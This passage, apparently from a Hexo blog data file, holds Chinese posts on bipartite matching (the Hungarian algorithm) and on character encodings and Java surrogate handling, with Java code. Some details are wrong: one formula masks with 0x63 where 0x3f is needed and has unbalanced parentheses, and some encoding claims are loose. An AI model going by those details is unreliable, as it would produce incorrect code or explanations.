寻找最大匹配（匈牙利算法）\n\n交错路径：给定图G的一个匹配M，如果一条路径的边，交替出现在M中和不出现在M中，则称为M-交错路径\n\n增广路径：如果一条M-交错路径，两个端点都不与M中的边关联，则称为M-增广路径\n\n\n\n可以使用匈牙利算法查找二分图中的最大匹配，如图所示，点集G<V, E>是一个二分图，可分独立集A和独立集B \n\n![图1](../static/MB20022301-1.png)\n\n具体算法如下：\n\n1. \n   每次从集合A中取一个未被选取的点，查看该点覆盖的所有边，如果存在一条边的另一端点（位于集合B）也未被选取，则将这两点相连。不断重复该过程，如同所示，第一次选择A1和B1连线，点二次选择A2和B3连线\n\n   ![图2](../static/MB20022301-2.png)    ![图3](../static/MB20022301-3.png)\n\n2. 如果A集合中选取的点，覆盖的所有边的另一端点均已被A集合上的点占去（如上图所示，A3覆盖的边A3B1的另一端点B1已经被A1占去），则尝试给占去Bj（该例中为B1）的点Ai（该例中为A1）换一个未被占用的点，如果又被占用，则继续考虑帮占用点换一个点...（这是一个递归过程）。实际上，这就是一个找增广路径的过程，因为要能找到这样的更换路径，在每次给占用点更换连线时，首先要求占用点有其他未连线的边，这样就形成了一个交替——边未匹配过、匹配过、未匹配过、匹配过、未匹配过...（奇数次且两端均是未匹配过）。\n\n   如下图所示，从A3出发，找到了一条路径：A3->B1->A1->B3->A2->B4（已匹配过的边颜色是红色）\n\n   ![图4](../static/MB20022301-4.png)\n\n   找到增广路径之后，将该条线上的红蓝色颜色对调（匹配与未匹配属性反转），就能找到一种总匹配数+1的匹配方式，如下图所示\n\n   ![图5](../static/MB20022301-5.png)\n\n重复1、2步，最终就能找到二分图G的最大匹配\n\n![图6](../static/MB20022301-6.png)\n\n","source":"_posts/2020-02-24_Bipartite_Graph.md","raw":"---\n\ntitle: 从二分图开始到最大匹配\ndate: 2020-02-23 14:22:00\ntags: 图论\npermalink: bipartite-graph\nkeywords: 最小覆盖, 最大匹配, 最大独立集\nrId: MB-20022301\n---\n\n## 图论概念\n\n* 图：由顶点和顶点之间的边组成的集合，表示为G<V, E>，V表示的是顶点的集合，E表示的是边的集合\n* 独立集：图内点集的子集，且满足：每两个顶点之间均不存在连边\n* 最大独立集：图内顶点数量最多的独立集\n* 覆盖：图内点集的子集，且满足：能覆盖（顶点是边的任一个端点都视为覆盖边）图的所有边\n* 最小覆盖：图内顶点数量最少的覆盖\n* 最小覆盖数：最小覆盖的顶点数量\n* 匹配：图内边集的子集，且满足：任意两条边都没有公共顶点\n* 最大匹配：图内边数量最多的匹配\n* 最大匹配数：最大匹配的边数量\n\n## 二分图\n\n设G<V, E>是一个无向图，如果顶点V可分割为两个互不相交的子集(A, B)，并且图中每条边(i, j)的两个顶点分别属于两个不同的集合(i属于A, j属于B)，则程图G是二分图。\n\n定理和推论：\n\n1. 无向图G是二分图的充要条件是：G至少有两个顶点，且所有环的长度都为偶数\n2. 最大独立集顶点数量 = 图中顶点数量 - 最小点覆盖数\n3. 最小覆盖数 = 最大匹配数\n\n\n\n二分图充要条件证明见[百度百科](<https://baike.baidu.com/item/%E4%BA%8C%E5%88%86%E5%9B%BE/9089095?fr=aladdin#3>)（以`边跨集合A和B，形成环必然需要一次往返的倍数`这个思路考虑）\n\n最大独立集顶点数量证明略（简单思考：去掉最小覆盖点，图中边自然也就不存在了）\n\n### 证明最小覆盖数等于最大匹配数\n\n条件：\n\n```\n图G<V,E>\n存在点集C是最小点覆盖，最小覆盖数为c\n存在边集M是最大匹配，最大匹配数为m\n```\n\n求证：m = c\n\n证明：\n\n> 1. 点集C是覆盖，则边集M上的任意一条边，至少有一端点属于C，所以m <= c  （光覆盖这些边就需要m个点）\n>\n> 2. 点集C是最小覆盖，则有如下两点结论：\n>\n>    ​    Ⅰ. 点集中每个点都**至少能找到一个**点集外的点与该点连边。如果没有，说明该点所有边端点都在覆盖中，那这个点也没必要包含了，与最小覆盖矛盾\n>    ​    Ⅱ. 点集中多个点**都只能**选择同一个点集外的点连边的情况也**不会出现**。如果出现，说明部分点不是必要的，就不是最小覆盖了。\n>\n>    上面两条保证了每个点都可以有一个覆盖外的点连边且这些连边不包含共同顶点，所以这些连边组成的边集是图G的一个匹配，所以m >= c\n>\n> 综上两点，m = c 得证\n\n## 寻找最大匹配（匈牙利算法）\n\n交错路径：给定图G的一个匹配M，如果一条路径的边，交替出现在M中和不出现在M中，则称为M-交错路径\n\n增广路径：如果一条M-交错路径，两个端点都不与M中的边关联，则称为M-增广路径\n\n\n\n可以使用匈牙利算法查找二分图中的最大匹配，如图所示，点集G<V, E>是一个二分图，可分独立集A和独立集B \n\n![图1](../static/MB20022301-1.png)\n\n具体算法如下：\n\n1. \n   每次从集合A中取一个未被选取的点，查看该点覆盖的所有边，如果存在一条边的另一端点（位于集合B）也未被选取，则将这两点相连。不断重复该过程，如同所示，第一次选择A1和B1连线，点二次选择A2和B3连线\n\n   ![图2](../static/MB20022301-2.png)    ![图3](../static/MB20022301-3.png)\n\n2. 如果A集合中选取的点，覆盖的所有边的另一端点均已被A集合上的点占去（如上图所示，A3覆盖的边A3B1的另一端点B1已经被A1占去），则尝试给占去Bj（该例中为B1）的点Ai（该例中为A1）换一个未被占用的点，如果又被占用，则继续考虑帮占用点换一个点...（这是一个递归过程）。实际上，这就是一个找增广路径的过程，因为要能找到这样的更换路径，在每次给占用点更换连线时，首先要求占用点有其他未连线的边，这样就形成了一个交替——边未匹配过、匹配过、未匹配过、匹配过、未匹配过...（奇数次且两端均是未匹配过）。\n\n   如下图所示，从A3出发，找到了一条路径：A3->B1->A1->B3->A2->B4（已匹配过的边颜色是红色）\n\n   ![图4](../static/MB20022301-4.png)\n\n   找到增广路径之后，将该条线上的红蓝色颜色对调（匹配与未匹配属性反转），就能找到一种总匹配数+1的匹配方式，如下图所示\n\n   ![图5](../static/MB20022301-5.png)\n\n重复1、2步，最终就能找到二分图G的最大匹配\n\n![图6](../static/MB20022301-6.png)\n\n","slug":"bipartite-graph","published":1,"updated":"2020-02-25T14:08:46.682Z","_id":"ck71vzldl0000swukl56pkpk3","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"图论概念\"><a href=\"#图论概念\" class=\"headerlink\" title=\"图论概念\"></a>图论概念</h2><ul>\n<li>图：由顶点和顶点之间的边组成的集合，表示为G&lt;V, E&gt;，V表示的是顶点的集合，E表示的是边的集合</li>\n<li>独立集：图内点集的子集，且满足：每两个顶点之间均不存在连边</li>\n<li>最大独立集：图内顶点数量最多的独立集</li>\n<li>覆盖：图内点集的子集，且满足：能覆盖（顶点是边的任一个端点都视为覆盖边）图的所有边</li>\n<li>最小覆盖：图内顶点数量最少的覆盖</li>\n<li>最小覆盖数：最小覆盖的顶点数量</li>\n<li>匹配：图内边集的子集，且满足：任意两条边都没有公共顶点</li>\n<li>最大匹配：图内边数量最多的匹配</li>\n<li>最大匹配数：最大匹配的边数量</li>\n</ul>\n<h2 id=\"二分图\"><a href=\"#二分图\" class=\"headerlink\" title=\"二分图\"></a>二分图</h2><p>设G&lt;V, E&gt;是一个无向图，如果顶点V可分割为两个互不相交的子集(A, B)，并且图中每条边(i, j)的两个顶点分别属于两个不同的集合(i属于A, j属于B)，则程图G是二分图。</p>\n<p>定理和推论：</p>\n<ol>\n<li>无向图G是二分图的充要条件是：G至少有两个顶点，且所有环的长度都为偶数</li>\n<li>最大独立集顶点数量 = 图中顶点数量 - 最小点覆盖数</li>\n<li>最小覆盖数 = 最大匹配数</li>\n</ol>\n<p>二分图充要条件证明见<a href=\"https://baike.baidu.com/item/%E4%BA%8C%E5%88%86%E5%9B%BE/9089095?fr=aladdin#3\" target=\"_blank\" rel=\"noopener\">百度百科</a>（以<code>边跨集合A和B，形成环必然需要一次往返的倍数</code>这个思路考虑）</p>\n<p>最大独立集顶点数量证明略（简单思考：去掉最小覆盖点，图中边自然也就不存在了）</p>\n<h3 id=\"证明最小覆盖数等于最大匹配数\"><a href=\"#证明最小覆盖数等于最大匹配数\" class=\"headerlink\" title=\"证明最小覆盖数等于最大匹配数\"></a>证明最小覆盖数等于最大匹配数</h3><p>条件：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">图G&lt;V,E&gt;</span><br><span class=\"line\">存在点集C是最小点覆盖，最小覆盖数为c</span><br><span class=\"line\">存在边集M是最大匹配，最大匹配数为m</span><br></pre></td></tr></table></figure>\n\n<p>求证：m = c</p>\n<p>证明：</p>\n<blockquote>\n<ol>\n<li><p>点集C是覆盖，则边集M上的任意一条边，至少有一端点属于C，所以m &lt;= c  （光覆盖这些边就需要m个点）</p>\n</li>\n<li><p>点集C是最小覆盖，则有如下两点结论：</p>\n<p>​    Ⅰ. 点集中每个点都<strong>至少能找到一个</strong>点集外的点与该点连边。如果没有，说明该点所有边端点都在覆盖中，那这个点也没必要包含了，与最小覆盖矛盾<br>​    Ⅱ. 点集中多个点<strong>都只能</strong>选择同一个点集外的点连边的情况也<strong>不会出现</strong>。如果出现，说明部分点不是必要的，就不是最小覆盖了。</p>\n<p>上面两条保证了每个点都可以有一个覆盖外的点连边且这些连边不包含共同顶点，所以这些连边组成的边集是图G的一个匹配，所以m &gt;= c</p>\n</li>\n</ol>\n<p>综上两点，m = c 得证</p>\n</blockquote>\n<h2 id=\"寻找最大匹配（匈牙利算法）\"><a href=\"#寻找最大匹配（匈牙利算法）\" class=\"headerlink\" title=\"寻找最大匹配（匈牙利算法）\"></a>寻找最大匹配（匈牙利算法）</h2><p>交错路径：给定图G的一个匹配M，如果一条路径的边，交替出现在M中和不出现在M中，则称为M-交错路径</p>\n<p>增广路径：如果一条M-交错路径，两个端点都不与M中的边关联，则称为M-增广路径</p>\n<p>可以使用匈牙利算法查找二分图中的最大匹配，如图所示，点集G&lt;V, E&gt;是一个二分图，可分独立集A和独立集B </p>\n<p><img src=\"../static/MB20022301-1.png\" alt=\"图1\"></p>\n<p>具体算法如下：</p>\n<ol>\n<li><p>每次从集合A中取一个未被选取的点，查看该点覆盖的所有边，如果存在一条边的另一端点（位于集合B）也未被选取，则将这两点相连。不断重复该过程，如同所示，第一次选择A1和B1连线，点二次选择A2和B3连线</p>\n<p><img src=\"../static/MB20022301-2.png\" alt=\"图2\">    <img src=\"../static/MB20022301-3.png\" alt=\"图3\"></p>\n</li>\n<li><p>如果A集合中选取的点，覆盖的所有边的另一端点均已被A集合上的点占去（如上图所示，A3覆盖的边A3B1的另一端点B1已经被A1占去），则尝试给占去Bj（该例中为B1）的点Ai（该例中为A1）换一个未被占用的点，如果又被占用，则继续考虑帮占用点换一个点…（这是一个递归过程）。实际上，这就是一个找增广路径的过程，因为要能找到这样的更换路径，在每次给占用点更换连线时，首先要求占用点有其他未连线的边，这样就形成了一个交替——边未匹配过、匹配过、未匹配过、匹配过、未匹配过…（奇数次且两端均是未匹配过）。</p>\n<p>如下图所示，从A3出发，找到了一条路径：A3-&gt;B1-&gt;A1-&gt;B3-&gt;A2-&gt;B4（已匹配过的边颜色是红色）</p>\n<p><img src=\"../static/MB20022301-4.png\" alt=\"图4\"></p>\n<p>找到增广路径之后，将该条线上的红蓝色颜色对调（匹配与未匹配属性反转），就能找到一种总匹配数+1的匹配方式，如下图所示</p>\n<p><img src=\"../static/MB20022301-5.png\" alt=\"图5\"></p>\n</li>\n</ol>\n<p>重复1、2步，最终就能找到二分图G的最大匹配</p>\n<p><img src=\"../static/MB20022301-6.png\" alt=\"图6\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"图论概念\"><a href=\"#图论概念\" class=\"headerlink\" title=\"图论概念\"></a>图论概念</h2><ul>\n<li>图：由顶点和顶点之间的边组成的集合，表示为G&lt;V, E&gt;，V表示的是顶点的集合，E表示的是边的集合</li>\n<li>独立集：图内点集的子集，且满足：每两个顶点之间均不存在连边</li>\n<li>最大独立集：图内顶点数量最多的独立集</li>\n<li>覆盖：图内点集的子集，且满足：能覆盖（顶点是边的任一个端点都视为覆盖边）图的所有边</li>\n<li>最小覆盖：图内顶点数量最少的覆盖</li>\n<li>最小覆盖数：最小覆盖的顶点数量</li>\n<li>匹配：图内边集的子集，且满足：任意两条边都没有公共顶点</li>\n<li>最大匹配：图内边数量最多的匹配</li>\n<li>最大匹配数：最大匹配的边数量</li>\n</ul>\n<h2 id=\"二分图\"><a href=\"#二分图\" class=\"headerlink\" title=\"二分图\"></a>二分图</h2><p>设G&lt;V, E&gt;是一个无向图，如果顶点V可分割为两个互不相交的子集(A, B)，并且图中每条边(i, j)的两个顶点分别属于两个不同的集合(i属于A, j属于B)，则程图G是二分图。</p>\n<p>定理和推论：</p>\n<ol>\n<li>无向图G是二分图的充要条件是：G至少有两个顶点，且所有环的长度都为偶数</li>\n<li>最大独立集顶点数量 = 图中顶点数量 - 最小点覆盖数</li>\n<li>最小覆盖数 = 最大匹配数</li>\n</ol>\n<p>二分图充要条件证明见<a href=\"https://baike.baidu.com/item/%E4%BA%8C%E5%88%86%E5%9B%BE/9089095?fr=aladdin#3\" target=\"_blank\" rel=\"noopener\">百度百科</a>（以<code>边跨集合A和B，形成环必然需要一次往返的倍数</code>这个思路考虑）</p>\n<p>最大独立集顶点数量证明略（简单思考：去掉最小覆盖点，图中边自然也就不存在了）</p>\n<h3 id=\"证明最小覆盖数等于最大匹配数\"><a href=\"#证明最小覆盖数等于最大匹配数\" class=\"headerlink\" title=\"证明最小覆盖数等于最大匹配数\"></a>证明最小覆盖数等于最大匹配数</h3><p>条件：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">图G&lt;V,E&gt;</span><br><span class=\"line\">存在点集C是最小点覆盖，最小覆盖数为c</span><br><span class=\"line\">存在边集M是最大匹配，最大匹配数为m</span><br></pre></td></tr></table></figure>\n\n<p>求证：m = c</p>\n<p>证明：</p>\n<blockquote>\n<ol>\n<li><p>点集C是覆盖，则边集M上的任意一条边，至少有一端点属于C，所以m &lt;= c  （光覆盖这些边就需要m个点）</p>\n</li>\n<li><p>点集C是最小覆盖，则有如下两点结论：</p>\n<p>​    Ⅰ. 点集中每个点都<strong>至少能找到一个</strong>点集外的点与该点连边。如果没有，说明该点所有边端点都在覆盖中，那这个点也没必要包含了，与最小覆盖矛盾<br>​    Ⅱ. 点集中多个点<strong>都只能</strong>选择同一个点集外的点连边的情况也<strong>不会出现</strong>。如果出现，说明部分点不是必要的，就不是最小覆盖了。</p>\n<p>上面两条保证了每个点都可以有一个覆盖外的点连边且这些连边不包含共同顶点，所以这些连边组成的边集是图G的一个匹配，所以m &gt;= c</p>\n</li>\n</ol>\n<p>综上两点，m = c 得证</p>\n</blockquote>\n<h2 id=\"寻找最大匹配（匈牙利算法）\"><a href=\"#寻找最大匹配（匈牙利算法）\" class=\"headerlink\" title=\"寻找最大匹配（匈牙利算法）\"></a>寻找最大匹配（匈牙利算法）</h2><p>交错路径：给定图G的一个匹配M，如果一条路径的边，交替出现在M中和不出现在M中，则称为M-交错路径</p>\n<p>增广路径：如果一条M-交错路径，两个端点都不与M中的边关联，则称为M-增广路径</p>\n<p>可以使用匈牙利算法查找二分图中的最大匹配，如图所示，点集G&lt;V, E&gt;是一个二分图，可分独立集A和独立集B </p>\n<p><img src=\"../static/MB20022301-1.png\" alt=\"图1\"></p>\n<p>具体算法如下：</p>\n<ol>\n<li><p>每次从集合A中取一个未被选取的点，查看该点覆盖的所有边，如果存在一条边的另一端点（位于集合B）也未被选取，则将这两点相连。不断重复该过程，如同所示，第一次选择A1和B1连线，点二次选择A2和B3连线</p>\n<p><img src=\"../static/MB20022301-2.png\" alt=\"图2\">    <img src=\"../static/MB20022301-3.png\" alt=\"图3\"></p>\n</li>\n<li><p>如果A集合中选取的点，覆盖的所有边的另一端点均已被A集合上的点占去（如上图所示，A3覆盖的边A3B1的另一端点B1已经被A1占去），则尝试给占去Bj（该例中为B1）的点Ai（该例中为A1）换一个未被占用的点，如果又被占用，则继续考虑帮占用点换一个点…（这是一个递归过程）。实际上，这就是一个找增广路径的过程，因为要能找到这样的更换路径，在每次给占用点更换连线时，首先要求占用点有其他未连线的边，这样就形成了一个交替——边未匹配过、匹配过、未匹配过、匹配过、未匹配过…（奇数次且两端均是未匹配过）。</p>\n<p>如下图所示，从A3出发，找到了一条路径：A3-&gt;B1-&gt;A1-&gt;B3-&gt;A2-&gt;B4（已匹配过的边颜色是红色）</p>\n<p><img src=\"../static/MB20022301-4.png\" alt=\"图4\"></p>\n<p>找到增广路径之后，将该条线上的红蓝色颜色对调（匹配与未匹配属性反转），就能找到一种总匹配数+1的匹配方式，如下图所示</p>\n<p><img src=\"../static/MB20022301-5.png\" alt=\"图5\"></p>\n</li>\n</ol>\n<p>重复1、2步，最终就能找到二分图G的最大匹配</p>\n<p><img src=\"../static/MB20022301-6.png\" alt=\"图6\"></p>\n"},{"title":"理解字符集编码及Java内存编码运行机制","date":"2020-02-13T14:15:32.000Z","keywords":"字符集编码, java内存","rId":"MB-20021301","_content":"\n## 常见编码详悉\n\n### Unicode和UTF-8的关系\n\nUnicode又称万国码，它将全世界大部分语言的常用字符都纳入了编码范围。Unicode和UTF-8的关系简单的来说可以理解为：\n\n* Unicode是字符集\n* UTF-8是编码规则\n\n字符集：为每一个“字符”分配一个唯一的数值（ID，或称码点、码位），即给汉字、英文等各种字符分配一个不重复的数值\n\n编码规则：将“码点”转换为字节序列的规则（数值转化为字节值的过程）\n\n\n\nUnicode字符集为每一个字符分配一个码点，例如：“中”的码点是20013，记作U+4E2D（20013的16进制是4E2D）\n\nUTF-8是一套以8位为一个编码单位的可变长编码，会将一个码点编码为1到4个字节（广义上的UTF-8），编码规则如下：\n\n```\n  U+0000 ~   U+007F: 0XXXXXXX\n  U+0080 ~   U+07FF: 110XXXXX 10XXXXXX\n  U+0800 ~   U+FFFF: 1110XXXX 10XXXXXX 10XXXXXX\n U+10000 ~ U+10FFFF: 11110XXX 10XXXXXX 10XXXXXX 10XXXXXX\n```\n\n根据上表可知，“中”字的码点U+4E2D属于第三行范围：\n\n```184\n       4    E    2    D\n‭    0100 1110 0010 1101‬    二进制值\n------------------------\n    0100   111000   101101 二进制值重新对齐\n1110XXXX 10XXXXXX 10XXXXXX 模板\n11100100 10111000 10101101 代入模板后值\n     228      184      173 字节值(byte，负值处理为正值了+256)\n```\n\n\n\n我们可以用java编写程序实现unicode值（16进制表示）和字符的转换，如下所示\n\n```\npublic class UnicodeCoder {\n\t/**\n\t * 字符串转为unicode值，参数二是否将ASCII字符转为unicode表示\n\t */\n\tpublic static String encode(String str, boolean encodeAscii) {\n\t\tStringBuilder sb = new StringBuilder();\n\t\tchar[] charArray = str.toCharArray();\n\t\tfor (int i = 0; i < charArray.length; i++) {\n\t\t\tchar c = charArray[i];\n\t\t\tsb.append(charToUnicodeString(c, encodeAscii));\n\t\t}\n\t\treturn sb.toString();\n\t}\n\t/**\n\t * unicode值转为字符串\n\t */\n\tpublic static String decode(String str) throws UnsupportDecodeException {\n\t\tStringBuilder sb = new StringBuilder();\n\t\tchar[] charArray = str.toCharArray();\n\t\tfor (int i = 0; i < charArray.length; i++) {\n\t\t\tchar c = charArray[i];\n\t\t\tif (c == '\\\\') {\n\t\t\t\tif (i == charArray.length - 1) {\n\t\t\t\t\tthrow new UnsupportDecodeException();\n\t\t\t\t}\n\t\t\t\tif (charArray[i + 1] == '\\\\') {\n\t\t\t\t\tsb.append(\"\\\\\");\n\t\t\t\t\ti++;\n\t\t\t\t} else if (charArray[i + 1] == 'u') {\n\t\t\t\t\tif (i >= charArray.length - 5 || !isHexChar(charArray[i + 2])\n\t\t\t\t\t\t\t || !isHexChar(charArray[i + 3]) || !isHexChar(charArray[i + 4])\n\t\t\t\t\t\t\t || !isHexChar(charArray[i + 5])) {\n\t\t\t\t\t\tthrow new UnsupportDecodeException();\n\t\t\t\t\t}\n\t\t\t\t\tString hexInt = \"\" + charArray[i + 2] + charArray[i + 3] + charArray[i + 4] + charArray[i + 5];\n\t\t\t\t\tchar v = (char) Integer.valueOf(hexInt, 16).intValue();\n\t\t\t\t\tsb.append(v);\n\t\t\t\t\ti += 5;\n\t\t\t\t} else {\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\tsb.append(c);\n\t\t\t}\n\t\t}\n\t\treturn sb.toString();\n\t}\n\tprivate static boolean isHexChar(char c) {\n\t\tif (c >= '0' && c <= '9') return true;\n\t\tif (c >= 'a' && c <= 'f') return true;\n\t\tif (c >= 'A' && c <= 'F') return true;\n\t\treturn false;\n\t}\n\tprivate static String charToUnicodeString(char c, boolean encodeAscii) {\n\t\tif (c < 0x80 && !encodeAscii) {\n\t\t\tif (c == '\\\\') {\n\t\t\t\treturn \"\\\\\\\\\";\n\t\t\t} else {\n\t\t\t\treturn c + \"\";\n\t\t\t}\n\t\t}\n\t\tString hex = Integer.toHexString(c);\n\t\tif (c < 0x10) {\n\t\t\treturn \"\\\\u000\" + hex;\n\t\t} else if (c < 0x100) {\n\t\t\treturn \"\\\\u00\" + hex;\n\t\t} else if (c < 0x1000) {\n\t\t\treturn \"\\\\u0\" + hex;\n\t\t} else {\n\t\t\treturn \"\\\\u\" + hex;\n\t\t}\n\t}\n\tpublic static class UnsupportDecodeException extends Exception {\n\t\tprivate static final long serialVersionUID = 1L;\n\n\t\tpublic UnsupportDecodeException() {\n\t\t}\n\t}\n\tpublic static void main(String[] args) throws UnsupportDecodeException {\n\t\tSystem.out.println(encode(\"中abcµ\", true)); // \\u4e2d\n\t\tSystem.out.println(\"\\u4e2d\"); // 不需要转换，jvm自动处理\n\t\tSystem.out.println(decode(\"\\\\u4e2d\")); // 中\n\t}\n}\n```\n\n### UTF-8和UTF-8MB4关系\n\nUnicode字符集，实际上有两个系列，分为2个字节和4个字节的两种，2个字节的Unicode字符集称为`UCS-2`（通常说的Unicode大都是`UCS-2`），4个字节的Unicode字符集称为`UCS-4`，`UCS-4`是`UCS-2`的超集。`UCS-2`可容纳65536个码位，`UCS-4`目前可用码位分为了17个平面（每个平面可容纳65536个码位，即一共1114112个码位，第1个平面被称为基本多语言平面，即`UCS-2`的字符集，其他16个平面统称为辅助平面），它为现有的所有文字和符号以及将来可能出现的字符都指定（或预留）了一个唯一的数字编码。\n\n**UTF-8MB3**\n\n通常所说的UTF-8（即狭义上的UTF-8），实际上是UTF-8MB3，一个字符占1-3个字节（只有编码规则的前三行），它是以`UCS-2`为字符集的编码规则。\n\n**UTF-8MB4**\n\n除了UTF-8MB3以外，还存在UTF-8MB4编码，一个字符占1-4个字节，可以表示超过65536个字符（没能达到1114112个，仅能表示20多万个），因此有能力表示`UCS-4`中的部分字符。\n\n\n\n### UTF-8、UTF-16和GBK、GB2312的区别\n\nUFT-8、UTF-16、GBK、GB2312都能编码汉字，但在汉字的支持数量上、以及字符集上有所差异。\n\n**GB2312**\n\nGB2312是由国内制定，在ASCII码的基础上扩充汉字编码制定的字符集与编码规则，共收录了6763个常用汉字，英文占一个字节，汉字占两个字节。\n\n**GBK**\n\nGBK编码，扩展了GB2312编码收录的字符数量，并沿用了GB2312的码位（是GB2312编码的超集），收录了21003个汉字，包含`UCS-2`汉字区的全部汉字。英文占一个字节，汉字占两个字节，向下兼容GB2312编码。\n\n**GB18030**\n\nGB18030编码，在GBK的基础上再次扩充了汉字字符数量，并增加了少数民族字符，收录了70244个汉字。与GB2312-1980完全向后兼容，与GBK基本兼容，并支持Unicode的所有码位。编码包含三种长度：单子节ASCII，双字节的GBK（略带扩展）、以及用于填补所有Unicode码位的四字节UTF区块（Unicode码位数1114112少于GB18030的161668个码位）。\n\n**BIG5**\n\nBIG5编码是台湾制定的基于ASCII扩充的中文编码规则，但其与GB2312字符集码位不是一个体系。\n\n\n\n**UTF-8**\n\n就像GBK编码一样，各国都对ASCII进行扩展定义了自己的编码，不利于国际间文件交换。Unicode编码是在这种背景下，国际标准组织将世界各国语言都纳入了编码体系，形成的一个字符集。\n\n前面说过Unicode有`UCS-2`和`UCS-4`两种，`UCS-2`汉字编码范围在U+4E00-9FA5，包含20928个汉字（仅汉字区），容纳中日韩（CJK）统一编码的汉字共27484个（日语区和韩语区也有部分日语韩语常用汉字）。而`UCS-4`的第1个平面即是`UCS-2`的码位，所以包含的汉字数量必然大于`UCS-2`（具体值没找到资料）。\n\nUTF-8MB3编码，以`UCS-2`字符集为基础的编码，而UTF-8MB4已经超过`UCS-2`字符集，包含部分`UCS-4`字符。\n\n**UTF-16**\n\nUTF-16与UTF-8一样，是众多UTF(UCS Transfer Format)标准中的一个，它是以`UCS-4`为字符集的编码规则，有2个字节和4个字节两种长度，2个字节的用于编码“基本多语言平面中的字符”（即`UCS-2`部分），4个字符编码其余辅助平面的字符。\n\n\n\nUTF-8和UTF-16算是一个字符集体系的编码，GB系列算一个字符集体系的编码。\n\n\n\n## Java中的内存编码\n\nJava内存唯一使用的编码是`Unicode`（`UCS-2`字符集，注意是内存编码，不是运行时与用户交互的编码）。平时调用的`String.getBytes()`方法，实际上就是将内存中字符的码点按指定编码规则组织为bytes数组，同理，`new String(bytes)`方法，即是将bytes数组按指定编码规则翻译成码点存在内存中。\n\n\n### 前端输入的emoji字符由UTF-8MB4编码，传到后端Java是如何处理的呢？\n\nJava采取的策略是将其转为两个UTF-8MB3字符。具体转换过程如下：\n\n1. **首先读取字节，如以\"😭\"表情为例，读取到如下字节（负数已处理为正数）**\n```\n240       159       152       173\n```\n二进制表示为\n```\nbytes[0]  bytes[1]  bytes[2]  bytes[3]\n‭11110000‬  ‭10011111‬  ‭10011000‬  ‭10101101‬\n```\n由于值是以utf8mb4编码的，观察二进制值，符合如下模板格式，抽离模板后即可得到码点值的二进制代码\n```\n11110xxx  10xxxxxx  10xxxxxx  10xxxxxx    二进制值模板\n     000    011111    011000‬    101101‬    抽离模板后得到码点值的二进制表示\n```\n上述码点值计算的过程可以用如下公式表示\n```\ncodePoint = ((bytes[0] & 0x7) << 18) + ((bytes[1] & 0x3f) << 12) + (bytes[2] & 0x3f) << 6) + (bytes[3] & 0x3f)\n```\n\n2. **将UTF-8MB4字符拆成为两个字符**\n步骤如下\n* 先将码点值减掉(2^16)，并去掉第1位\n```\nval = codePoint - (1 << 16)\nval = val & 0xFFFFF;\n     000    001111    011000    101101        计算后的二进制值\n      00    001111    011000    101101        去掉第1位\n```\n* 然后填充到固定转化模板（后面解释），得到两个三字节的UTF-8编码值\n```\n11101101  1010xxxx  10xxxxxx    11101101  1011xxxx  10xxxxxx    固定转化模板\n11101101  10100000  10111101    11101101  10111000  10101101    填充后二进制值\n```\n* 再计算新的码点（此时是两个三字节的UTF-8编码值，所以有如下模板）\n```\n1110xxxx  10xxxxxx  10xxxxxx    1110xxxx  10xxxxxx  10xxxxxx    三字节格式二进制值模板\n    1101    100000    111101        1101    111000    101101    抽离模板后值\n```\n* 整理二进制位，得到两个新的Unicode码点：D83D, DE2D\n```\n11011000  00111101              11011110  00101101\nD83D                            DE2D\n```\n\n上面的转换步骤稍加整理后，可以得到公式：\n\n```\n新码点的值计算：\nval = ((bytes[0] & 0x7) << 18) + ((bytes[1] & 0x63) << 12) + (bytes[2] & 0x63) << 6) + (bytes[3] & 0x63) - (1 << 16)\nval = val & 0xFFFFF\n// 110110xxxxxxxxxx 110111xxxxxxxxxx    来自固定转化模板的值\n// 0b110110 = 54\n// 54 << 10 = 0xD800\ncodePointN[0] = (val >>> 10) + 0xD800\n// 0b110111 = 55\n// 55 << 10 = 0xDC00\ncodePointN[1] = (val & 0x3FF) + 0xDC00\n```\n\n\n\n**拆分字符时使用的固定转化模板为什么是这个？**\n\n**其一** 3字节UTF-8，固定了一些位\n\n```\n1110xxxx  10xxxxxx  10xxxxxx    1110xxxx  10xxxxxx  10xxxxxx\n```\n\n**其二** 新码点不能与UTF-8MB3冲突，所以选用为UTF-16永久保留不映射的码点区间(`0xD800-0xDBFF`和`0xDC00-0xDFFF`)作为新值所在的区间（两个区间的区别只是与大端和小端的规定有关）\n因此又可以固定剩余几位（`D8`二进制为‭`11011000`‬，`DB`二进制为‭`11011011`‬，`DC`二进制为`‭11011100`‬，`DF`二进制为`‭11011111`‬）\n\n```\n11101101  1010xxxx  10xxxxxx    11101101  1011xxxx  10xxxxxx\n```\n\n**关于码点值减掉(2^16)**\n\n参见JDK中的`java.lang.Character#highSurrogate`方法，这是用于计算高位值的方法\n\n相应的，低位值计算方法见`java.lang.Character#lowSurrogate`方法\n\n它们被调用的位置见`sun.nio.cs.UTF_8.Decoder#decode`方法\n\n\n\n### 关于内存编码处理的测试代码\n```\n\t...\n\tpublic static void main(String[] args) throws IOException, UnsupportDecodeException {\n\t\tbyte[] bytes = new byte[10];\n\t\tint read = System.in.read(bytes);\n\t\tSystem.out.println(\"读取byte如下 --> \");\n\t\tfor (int i = 0; i < read; i++) { // 最后一个打印10为回车键\n\t\t\tSystem.out.println(bytes[i] & 0xff);\n\t\t}\n\t\tSystem.out.println(\"读取内容如下 --> \");\n\t\tSystem.out.println(new String(bytes, 0, read));\n\t\tSystem.out.println(\"-----------------\");\n\t\tint val = ((bytes[0] & 0x7) << 18) + ((bytes[1] & 0x3f) << 12) + ((bytes[2] & 0x3f) << 6) + (bytes[3] & 0x3f) - (1 << 16);\n\t\tval = val & 0xFFFFF;\n\t\tint high = (val >>> 10) + 0xD800;\n\t\tint low = (val & 0x3FF) + 0xDC00;\n\t\tSystem.out.println(Integer.toHexString((high & 0xffff) >> 8));\n\t\tSystem.out.println(Integer.toHexString(high & 0xff));\n\t\tSystem.out.println(Integer.toHexString((low & 0xffff) >> 